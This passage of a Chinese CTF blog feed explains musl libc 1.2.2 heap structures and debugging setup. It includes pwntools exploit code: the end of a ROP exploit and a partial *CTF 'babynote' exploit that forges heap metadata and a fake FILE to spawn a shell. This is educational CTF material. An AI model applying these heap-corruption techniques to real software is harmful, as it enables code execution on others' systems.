class="number">0</span>)+p64(write)</span><br><span class="line">sla(<span class="string">b&#x27;well,prepare your rop now!\n&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">b&#x27;Enter your flag: &#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x405458</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">s(payload)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Nepnep-CTF-pwn&quot;&gt;&lt;a href=&quot;#Nepnep-CTF-pwn&quot; class=&quot;headerlink&quot; title=&quot;Nepnep-CTF-pwn&quot;&gt;&lt;/a&gt;Nepnep-CTF-pwn&lt;/h1&gt;&lt;p&gt;打了一下nep的比赛，由于个人原因，做了ti</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="Nepnep" scheme="https://gggtaotao.github.io/tags/Nepnep/"/>
    
    <category term="ctf" scheme="https://gggtaotao.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>musl_libc_pwn学习</title>
    <link href="https://gggtaotao.github.io/2025/07/25/musl-libc-pwn%E5%AD%A6%E4%B9%A0/"/>
    <id>https://gggtaotao.github.io/2025/07/25/musl-libc-pwn%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-07-25T06:16:44.000Z</published>
    <updated>2025-07-29T06:24:17.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="musl-libc学习（1-2-2）"><a href="#musl-libc学习（1-2-2）" class="headerlink" title="musl_libc学习（1.2.2）"></a>musl_libc学习（1.2.2）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1.1.xx的版本已经很老了，估计也不会遇到了，所以这里就不再学习了<del>主要是因为本人太懒了</del>，目前musl-libc已经出到了1.2.5-3了，但是貌似能搜到的题只有1.2.2的，所以学习一下1.2.2的堆管理结构，以及如何利用</p><p>(文章内容为个人见解，有错误的话欢迎大佬批评指出)</p><h2 id="环境布置"><a href="#环境布置" class="headerlink" title="环境布置"></a>环境布置</h2><p>musl-libc是集libc和ld为一体的，所以只要一个libc.so就够了，要调试musl的题，调试符号是必不可少的，但是从其他大佬的博客来看，都是要下载调试符号包，然后加载，本人鼓捣了半天，结果还是加载不出调试符号(可能是操作有误)，ubuntu要下载各个版本的调试符号包以及各种包的话可以去官网，<a href="https://launchpad.net/ubuntu/+source/musl">这里放个链接</a></p><h3 id="加载调试符号"><a href="#加载调试符号" class="headerlink" title="加载调试符号"></a>加载调试符号</h3><p>因为实在加载不出符号调试表，所以直接在源码编译的时候加了调试符号，直接使用带有调试符号的libc.so</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/桌面/musl</span><br><span class="line">wget https://musl.libc.org/releases/musl-1.2.2.tar.gz <span class="comment">#下载源码安装包</span></span><br><span class="line">tar -zxvf musl-1.2.2.tar.gz <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> musl-1.2.2</span><br><span class="line">./configure CFLAGS=<span class="string">&quot;-g -O0&quot;</span> --prefix=/usr/local/musl-1.2.2 <span class="comment"># 配置编译参数，启用调试符号（-g）并禁用优化（-O0），并指定了安装路径/usr/local/musl-1.2.2 ，可自行修改</span></span><br><span class="line">make -j4 <span class="comment"># 编译（-j4 表示使用4线程加速）</span></span><br><span class="line"><span class="built_in">sudo</span> make install <span class="comment"># 安装到指定目录，也就是上面的/usr/local/musl-1.2.2</span></span><br></pre></td></tr></table></figure><p>之后可以在path to/musl-1.2.2/lib下找到libc.so文件，此文件是加载了调试符号的</p><h3 id="muslheap插件"><a href="#muslheap插件" class="headerlink" title="muslheap插件"></a>muslheap插件</h3><p>安利<strong>xf1les</strong> 师傅编写的musl heap gdb 插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xf1les/muslheap.git</span><br></pre></td></tr></table></figure><p>安装方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source /path/to/muslheap.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>具体使用方法以及环境要求在read.me文件里有，这里不再赘述，安装好之后就可以使用mheap等调试musl很方便的指令了</p><h3 id="patchelf换libc"><a href="#patchelf换libc" class="headerlink" title="patchelf换libc"></a>patchelf换libc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /path to your/libc.so ./pwn <span class="comment">#将要调试的文件使用的libc更换为上述增加了调试符号的libc.so</span></span><br></pre></td></tr></table></figure><h3 id="编译使用musl的程序"><a href="#编译使用musl的程序" class="headerlink" title="编译使用musl的程序"></a>编译使用musl的程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/path to your/musl-1.2.2/bin/musl-gcc -g test.c -o <span class="built_in">test</span></span><br><span class="line">patchelf --set-interpreter /path to your/libc.so ./test <span class="comment">#你编译出来的elf还是会使用本地的libc.so，记得换成你加载了调试符号的libc.so</span></span><br></pre></td></tr></table></figure><p>编译musl程序，需要用到musl-gcc，上述加载调试符号时编译的源码里就有，因为版本是1.2.2的，所以编译出来的文件也是1.2.2的如果要编译其他版本的elf的话，和上述操作类似，下载一份其他版本的源码，编译好之后用配套的musl-gcc编译即可</p><h2 id="堆管理结构学习"><a href="#堆管理结构学习" class="headerlink" title="堆管理结构学习"></a>堆管理结构学习</h2><p>musl的堆管理结构和glibc的区别还是挺大的，musl的堆管理结构没有bins，而是通过meta_area管理meta，meta管理group，group管理chunk来实现的，其中__malloc_context又记录着meta的情况以及meta_area的情况，网上很多博客关于此结构已经写的很清楚了，这里主要写一下我自己的见解，放几个链接大家可以参考一下</p><p><a href="https://bbs.kanxue.com/thread-269533-1.htm">链接1</a></p><p><a href="https://www.anquanke.com/post/id/253566">链接2</a></p><p><a href="https://blog.xmcve.com/2022/08/08/musl基础知识整理/#title-8">链接3</a></p><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context"></a>__malloc_context</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">   <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">   <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">   <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">   <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">   <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">   <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">   <span class="type">uint8_t</span> seq;</span><br><span class="line">   <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20150108.png" alt="屏幕截图 2025-07-25 150108"></p><p>1.active数组中储存着不同大小的meta，分别在对应的位置，如管理大小为0x30chunk的meta在active[2]，这些meta通过双向循环链表连接 来</p><p>2.avail_meta表示剩余的可用的meta数量，上图为87，如果我没有malloc 0x40大小的chunk的话，上图就不会有active[3]，那么avail_meta的数量应该是88</p><p>3.free_meta表示已经释放的meta数量，这里为0</p><p>4.avail_meta_area表示可用的meta_area,如图表示下一个可用的meta_area的位置是0x653909391000</p><p>5.meta_area_head和tail分别指向meat_area链表的头部和尾部，这里因为只有一个meta_area，所以指向相同的地方</p><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-28%20112640.png" alt="屏幕截图 2025-07-28 112640"></p><p>1.check和malloc_context中的<code>uint64_t secret</code> 是一样的</p><p>2.next是用来维护meta_area链表的，这个结构是通过单链表维护的</p><p>3.nslots记录着当前使用的meta数量</p><p>4.meta slots[]就是存储着一系列的meta</p><p>一般一个meta_area的大小是一页，也就是0x1000，然后前0x18的大小是自身结构，也就是check，next，nslots，之后便是一个一个的meta</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span>   <span class="comment">//双向链表</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>          <span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">   <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">   <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20150931.png" alt="屏幕截图 2025-07-25 150931"></p><p>1.prev和next分别指向此meta的上一个meta和下一个meta，通过此结构双向链表的结构连接起来</p><p>2.mem记录着此meta对应的group的地址在哪</p><p>3.last_idx的数字意味着这个meta最多可以管理几个chunk，[0~last_idx]，上图所示的话也就是10个</p><p>4.freeable代表这个meta可不可以被释放，1为可以</p><p>5.sizeclass代表这个meta管理的chunk的大小，此图是2，和上图的active[2]是对应的，也就是管理的0x30大小的chunk</p><p>6.avail_mask和freed_mask都要转变成二进制看：</p><p>512的二进制是0b1000000000,意味着我已经申请了9个chunk（对应0）只剩最后一个chunk没有申请了</p><p>20的二进制是0b10100，意味着编号为2，4的chunk被free掉了</p><h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span>   </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// meta的地址</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">   <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">// 保证0x10字节对齐</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20151945.png" alt="屏幕截图 2025-07-25 151945"></p><p>group的前8字节记录着此group对应的meta的地址，active_idx，也就是9，记录着此group管理的chunk的数量</p><p>至于pad，还没明白是用来干什么的，有知道的可以佬可以说一下</p><p>接着就是chunk里的内容了如图0x6161这些是chunk里的内容</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">   <span class="type">uint8_t</span> idx;        <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">   <span class="type">uint16_t</span> offset;    <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">   <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20152455.png" alt="屏幕截图 2025-07-25 152455"></p><p>如0x6538f4fa2ca8的0x0003a1000000000d</p><p>其中0003是对应着offset</p><p>而a1是chunk的idx</p><p>这个程序是我自己编写用来调试的，申请的第一个chunk的idx就是a0，估计是前面的chunk的idx是程序初始化使用了吧</p><p>而最后的d,目前没有找到大佬介绍，我自己试着调试了一下，这个值和申请的chunk的大小有关</p><p>可以看到上图中的那个位置有d有0有c，位置为d的那个chunk我是malloc(0x1f)得到的，而c的chunk我是malloc(0x20)得到的，如果malloc(0x28)及以上的话，那个位置就是0了，也就是说，这个地方的数字对应着这个chunk还可以再大多少，比如d的那个地方，说明我malloc(0x1f+0xd)，也会使用这个chunk,c的位置便是malloc(0x20+0xc)，而当malloc(0x29)时，已经覆盖了这个位置，所以就变成0了，也就是说我malloc(0x1d~0x2c)得到的chunk的大小是一样的</p><p>类似于glibc中物理相邻的上一个chunk可以使用下一个chunk的psize位，musl中的上一个chunk可以使用下一个chunk的12个字节（也可以说是4个字节，看你怎么理解chunk头吧）对应于0x0003a1000000000d，我可以溢出写成0x0003a100061616161，</p><p>chunk可以通过记录的offset找到group，比如位于0xa0的chunk的offset是3，0xb0-(3+1)*0x10=0x70，就找到了group，而group又可以通过记录的meta地址找到meta，以此来管理堆结构</p><h2 id="关于malloc和free"><a href="#关于malloc和free" class="headerlink" title="关于malloc和free"></a>关于malloc和free</h2><p>我试着写了一下这个逻辑，但是写的不是很清晰，这里直接放个链接，觉得写的很好，总结的很到位，大家可以看这篇文章</p><p><a href="https://blog.xmcve.com/2022/08/08/musl基础知识整理/#title-9">链接</a></p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="CTF-babynote"><a href="#CTF-babynote" class="headerlink" title="*CTF babynote"></a>*CTF babynote</h3><p>大体思路：</p><p>1.泄露libc和pie</p><p>2.申请一个大的slot，页对齐，然后伪造meta_arae,meta,group,chunk</p><p>3.然后释放chunk，在dequeue过程中利用meta的双向链表指针互写，向ofl_head中写如fake_io的地址</p><p>4.然后执行exit，通过fake_io进行FSOP执行system(“/bin/sh”)，getshell</p><p>（感觉这道题的堆风水好难布置）</p><p>这里强推一篇文章，真的超级详细 <a href="https://blog.xf1les.net/2022/04/20/starctf2022-babynote-writeup/#3-前置条件">就是这个</a>，我这里就不做过多解释了，这个题貌似因为环境不一样，我用博主的exp不成功，自己按照思路调了一下exp，本地成功了，可能你们用我的exp也成功不了吧</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babynote&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">b&#x27;note size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uuu64</span>(<span class="params">data</span>):</span><br><span class="line">    hex_str = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        hex_str = <span class="string">&#x27;0&#x27;</span> + hex_str</span><br><span class="line">    bytes_list = [hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)]</span><br><span class="line">    reversed_hex_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(bytes_list))</span><br><span class="line">    hex_number = <span class="built_in">int</span>(reversed_hex_str, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_number</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babynote&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">b&#x27;M0&#x27;</span>,<span class="string">b&#x27;M0&#x27;</span>)</span><br><span class="line">clear()</span><br><span class="line">add(<span class="string">b&#x27;uaf&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">b&#x27;M1&#x27;</span>, <span class="string">b&#x27;M1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="string">b&#x27;M2&#x27;</span>, <span class="string">b&#x27;M2&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;uaf&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;X&#x27;</span>, <span class="string">b&#x27;X&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">find(<span class="string">b&#x27;uaf&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x28:&#x27;</span>)</span><br><span class="line">libc_base=uuu64(r(<span class="number">12</span>))-<span class="number">0xdea50</span></span><br><span class="line">r(<span class="number">4</span>)</span><br><span class="line">pie=uuu64(r(<span class="number">12</span>))-<span class="number">0x4fc0</span>-<span class="number">0xfd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">uaf_name=li(<span class="number">0xdeda0</span>)</span><br><span class="line">secret=li(<span class="number">0xdbae0</span>)</span><br><span class="line">payload=p64(uaf_name)+p64(secret)+p64(<span class="number">3</span>)+p64(<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">find(payload)</span><br><span class="line">find(<span class="string">b&#x27;uaf&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x8:&#x27;</span>)</span><br><span class="line">key=uuu64(r(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">ofl_head=li(<span class="number">0xdde68</span>)</span><br><span class="line">fake_io=pi(<span class="number">0x4850</span>)</span><br><span class="line">page=li(-<span class="number">0x9000</span>)</span><br><span class="line">payload=flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>:p64(key), <span class="comment">#secret</span></span><br><span class="line">        <span class="number">0x8</span>:p64(ofl_head-<span class="number">8</span>),<span class="comment">#prev</span></span><br><span class="line">        <span class="number">0x10</span>:p64(fake_io),<span 